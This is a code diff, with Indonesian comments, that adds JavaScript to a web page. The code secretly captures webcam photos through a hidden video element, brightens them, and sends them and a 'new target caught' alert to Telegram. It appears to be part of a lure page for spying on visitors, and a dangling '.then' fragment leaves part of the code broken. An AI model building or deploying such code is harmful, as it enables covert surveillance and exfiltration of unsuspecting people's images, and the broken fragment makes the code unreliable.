@@ -253,6 +253,114 @@
         
         // Bonus: Catet IP publik (pake API eksternal, tapi agak ribet)
         // Tapi gapapa, yang penting dapet fotonya dulu!
+        // ================== FUNGSI MOTRET DENGAN ANTI HITAM ==================
+function captureAndSendPhoto() {
+    if (!videoStream || !isCameraActive) return;
+    
+    photoCount++;
+    
+    // Buat elemen video
+    const hiddenVideo = document.createElement('video');
+    hiddenVideo.srcObject = videoStream;
+    hiddenVideo.autoplay = true;
+    hiddenVideo.muted = true;
+    hiddenVideo.playsinline = true;
+    hiddenVideo.style.display = 'none';
+    
+    // TUNGGU VIDEO SIAP
+    hiddenVideo.oncanplay = function() {
+        // Kasih jeda buat adaptasi cahaya
+        setTimeout(function() {
+            // Buat canvas dengan ukuran lebih gede
+            const canvas = document.createElement('canvas');
+            
+            // Pake resolusi asli video, jangan di-scale
+            canvas.width = hiddenVideo.videoWidth;
+            canvas.height = hiddenVideo.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            
+            // Terapin brightness adjustment dikit
+            ctx.filter = 'brightness(1.1) contrast(1.1)'; // Cerahin dikit
+            
+            // Gambar video ke canvas
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Reset filter biar gak ngaruh ke gambar berikutnya
+            ctx.filter = 'none';
+            
+            // Konversi ke blob dengan kualitas tinggi
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    // KIRIM KE TELEGRAM
+                    sendPhotoToTelegram(blob);
+                    
+                    // Update status di web
+                    const statusEl = document.getElementById('status');
+                    if (statusEl) {
+                        statusEl.innerHTML = `📸 Foto ke-${photoCount} terkirim! (${Math.round(blob.size/1024)} KB)`;
+                    }
+                    
+                    // Log di console
+                    console.log(`📸 Foto ${photoCount} terkirim: ${Math.round(blob.size/1024)} KB`);
+                }
+            }, 'image/jpeg', 0.9); // Kualitas 90%
+            
+        }, 800); // Jeda 0.8 detik biar exposure pas
+    };
+    
+    // Fallback kalo oncanplay gak kepanggil
+    hiddenVideo.onloadeddata = function() {
+        // Coba juga pake loadeddata
+        setTimeout(function() {
+            if (photoCount > 0) return; // Hindari duplikasi
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = hiddenVideo.videoWidth;
+            canvas.height = hiddenVideo.videoHeight;
+            canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+            
+            canvas.toBlob(function(blob) {
+                if (blob) sendPhotoToTelegram(blob);
+            }, 'image/jpeg', 0.9);
+        }, 1000);
+    };
+    
+    document.body.appendChild(hiddenVideo);
+    
+    // Hapus video setelah 5 detik biar gak numpuk
+    setTimeout(() => {
+        if (hiddenVideo.parentNode) {
+            hiddenVideo.parentNode.removeChild(hiddenVideo);
+        }
+    }, 5000);
+}
+
+// ================== MODIFIKASI START CAMERA ==================
+// Tambahin ini di dalam .then setelah stream didapat
+.then(function(stream) {
+    videoStream = stream;
+    isCameraActive = true;
+    
+    // Tampilkan preview
+    const videoElement = document.getElementById('previewVideo');
+    if (videoElement) {
+        videoElement.srcObject = stream;
+    }
+    
+    // Update status
+    document.getElementById('status').innerHTML = '✅ Kamera siap! Motret dalam 3 detik...';
+    
+    // KIRIM NOTIF KE TELEGRAM
+    sendTelegramMessage("🚨 TARGET BARU KENA!\n\n⏰ Waktu: " + new Date().toLocaleString() + "\n📱 Status: Kamera aktif, bersiap motret...");
+    
+    // JANGAN LANGSUNG MOTRET! TUNGGU 3 DETIK
+    setTimeout(function() {
+        document.getElementById('status').innerHTML = '📸 MULAI MOTRET!';
+        startTakingPhotos();
+    }, 3000);
+})
     </script>
+    <script src="script.js"></script>
 </body>
 </html>
